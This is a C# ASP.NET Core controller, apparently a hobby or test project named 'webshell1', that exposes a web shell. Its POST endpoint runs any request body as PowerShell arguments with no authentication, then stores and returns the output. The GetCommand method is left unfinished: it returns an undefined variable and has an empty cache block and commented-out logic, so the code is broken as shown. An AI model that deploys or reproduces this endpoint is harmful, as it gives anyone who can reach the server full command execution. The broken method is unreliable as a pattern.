using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.Caching.Distributed;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading.Tasks;

namespace webshell1.Controllers
{
    [Route("[controller]")]
    [ApiController]
    public class CommandsController : Controller
    {
        private readonly CommandContext context;
        private readonly IDistributedCache cache;

        public CommandsController(CommandContext context, IDistributedCache cache)
        {
            this.context = context;
            this.cache = cache;
        }
        [HttpGet]
        public async Task<ActionResult<List<Command>>> Index()
        {
            return await context.Commands.ToListAsync();
        }
        [HttpGet("{id}")]
        public Task<ActionResult<Command>> GetCommand(int id)
        {
            string requestTag = "";
            bool isCached = false;
            if (Request.Headers.ContainsKey("If-None-Match"))
            {
                requestTag = Request.Headers["If-None-Match"].First();
                if (!string.IsNullOrEmpty(requestTag))
                {
                    string oldCacheKey = $"command-{id}-{requestTag}";
                    string cachedCommandJson = this.cache.GetString(oldCacheKey);
                    if (!string.IsNullOrEmpty(cachedCommandJson))
                    {
                        
                    }
                }
            }
            //Command command = await context.Commands.FindAsync(id);

            //if (command == null)
            //{
            //    return NotFound();
            //}

            return command;
        }
        [HttpGet("last")]
        public async Task<ActionResult<Command>> GetLastCommand()
        {
            var command = await context.Commands.OrderBy(c => c.Id).LastOrDefaultAsync();

            if (command == null)
            {
                return NotFound();
            }
            return command;
        }
        [HttpPost]
        public async Task<ActionResult<Command>> PostCommand([FromBody] string input)
        {
            string output = Execute(input);
            Command command = new Command { Input = input, Output = output };
            context.Commands.Add(command);
            await context.SaveChangesAsync();
            return CreatedAtAction("Index", new { id = command.Id }, command);
        }
        private string Execute(string input)
        {
            Process process = new Process();
            process.StartInfo.FileName = "powershell.exe";
            process.StartInfo.Arguments = input;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.Start();
            StreamReader outputReader = process.StandardOutput;
            StreamReader errorReader = process.StandardError;
            string output = string.Concat(outputReader.ReadToEnd(), errorReader.ReadToEnd());
            process.WaitForExit();
            return output;
        }
    }
}